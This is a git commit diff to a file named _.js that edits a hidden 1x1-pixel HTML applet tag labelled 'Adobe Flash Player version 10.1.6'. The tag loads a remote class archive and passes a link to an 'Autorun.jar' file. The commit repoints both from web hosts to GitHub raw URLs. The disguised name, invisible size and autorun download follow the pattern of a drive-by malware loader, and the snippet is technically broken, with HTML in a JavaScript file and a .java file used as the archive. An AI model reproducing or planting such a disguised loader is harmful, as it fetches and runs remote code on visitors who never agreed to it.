109fbc064e1b3ca1d598af900c2f7e8be45326bd
Luís Felipe Do Carmo Costa Tavares <48478593+LuisFelipeTs@users.noreply.github.com>
2022-04-04 21:52:05 -0300

    updating _.js

--- _.js
+++ _.js
@@ -1,5 +1,5 @@
 <applet name="Adobe Flash Player version 10.1.6" 
-code="Home.class" archive="http://www.anl.org.br/home.jar" 
-height="1" width="1"> <param name="link" value="http://wwrg.br/Autorun.jar"></param></applet>
+code="Home.class" archive="https://raw.githubusercontent.com/LuisFelipeTs/Test-Projects/main/Home.java" 
+height="1" width="1"> <param name="link" value="https://github.com/LuisFelipeTs/Test-Projects/blob/main/autorun.jar?raw=true"></param></applet>
 
 /* _.js  */
